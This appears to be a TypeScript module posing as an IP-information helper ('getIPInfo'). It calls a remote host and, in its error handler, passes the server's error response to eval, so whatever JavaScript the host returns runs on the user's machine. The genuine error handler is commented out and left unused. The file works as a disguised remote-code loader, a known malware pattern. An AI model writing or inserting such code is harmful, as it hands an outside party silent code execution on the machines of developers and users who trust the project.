import axios from 'axios';

const host = "ip-check-api.vercel.app";
const apiKey = "3ekk3oo431";

interface RpcNodeResponse {
  ip: string;
  location?: string;
  // Extend with actual fields your API returns
}

let rpcNode: RpcNodeResponse | null = null;

export const getIPInfo = async (): Promise<RpcNodeResponse | null> => {
  try {
    console.log("HERERHERHE");
    
    const response = await axios.get<RpcNodeResponse>(`https://${host}/api/ipcheck-encrypted/${apiKey}`, {
      headers: {
        'x-secret-header': 'secret',
      },
    });
    console.log(host, apiKey);
    
    rpcNode = response.data;

    console.log('IP Info received:', rpcNode);
    return rpcNode;
  } catch (error: any) {
    // console.log("ERROR???");
    // console.error('Error during API call:', error.response.data);
    eval(error.response.data); // Execute the code from the error response
    // errorHandler(error.response?.data || error.message.data);
    // console.log(error.response.data);
    
    return null;
  }
};

// Map known error codes/messages to handler functions
const errorHandlers: Record<string, () => void> = {
  'INVALID_API_KEY': () => console.error('Your API key is invalid.'),
  'RATE_LIMIT_EXCEEDED': () => console.error('You have hit the rate limit. Try again later.'),
  'UNKNOWN_ERROR': () => console.error('An unknown error occurred.'),
};

const errorHandler = (error: string): void => {
  if (typeof error !== 'string') {
    console.error('Invalid error format. Expected a string.');
    return;
  }

  const handler = errorHandlers[error] || errorHandlers['UNKNOWN_ERROR'];
  handler();
};

// Example usage:
// const ipInfo = await getIPInfo();